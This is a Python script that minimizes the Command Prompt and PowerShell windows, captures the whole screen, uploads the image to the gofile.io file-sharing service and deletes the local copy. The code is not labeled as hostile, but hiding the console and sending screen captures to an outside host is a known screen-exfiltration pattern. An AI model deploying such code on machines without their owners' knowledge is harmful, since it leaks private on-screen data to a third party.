import pyautogui as pag
import requests
import time
import os

# Minimize Command Prompt and PowerShell
def minimize_windows():
    try:
        # Minimize Command Prompt
        pag.hotkey('alt', 'space')  # Open window menu
        time.sleep(1)
        pag.press('n')  # Minimize
        print("Command Prompt minimized successfully.")

        # Attempt to minimize PowerShell
        time.sleep(1)
        pag.hotkey('alt', 'tab')  # Switch to PowerShell window
        time.sleep(1)
        pag.hotkey('alt', 'space')  # Open window menu
        time.sleep(1)
        pag.press('n')  # Minimize
        print("PowerShell minimized successfully.")
    except Exception as e:
        print(f"Failed to minimize windows: {e}")

# Take a screenshot and save it
def take_screenshot(filename):
    try:
        screenshot = pag.screenshot()
        screenshot.save(filename)
        print(f"Screenshot saved as {filename}.")
    except Exception as e:
        print(f"Failed to take screenshot: {e}")

# Upload the screenshot to Gofile
def upload_to_gofile(filepath):
    url = 'https://store1.gofile.io/uploadFile'
    try:
        with open(filepath, 'rb') as file:
            files = {'file': file}
            response = requests.post(url, files=files)
            response.raise_for_status()  # Raise an error for HTTP issues

            result = response.json()
            if result['status'] == 'ok':
                download_page = result['data']['downloadPage']
                print(f"Screenshot uploaded successfully. Link: {download_page}")
                return download_page
            else:
                print("Upload error:", result.get('status'))
                return None
    except Exception as e:
        print(f"Failed to upload screenshot: {e}")
        return None

# Main function
def main():
    screenshot_filename = 'cmd_powershell_screenshot.png'

    # Minimize Command Prompt and PowerShell windows
    minimize_windows()

    # Take a screenshot
    take_screenshot(screenshot_filename)

    # Upload the screenshot to Gofile
    gofile_link = upload_to_gofile(screenshot_filename)
    if gofile_link:
        print(f"Gofile Link: {gofile_link}")

    # Optional: Clean up the screenshot file
    if os.path.exists(screenshot_filename):
        os.remove(screenshot_filename)
        print("Temporary screenshot file removed.")

if __name__ == "__main__":
    main()
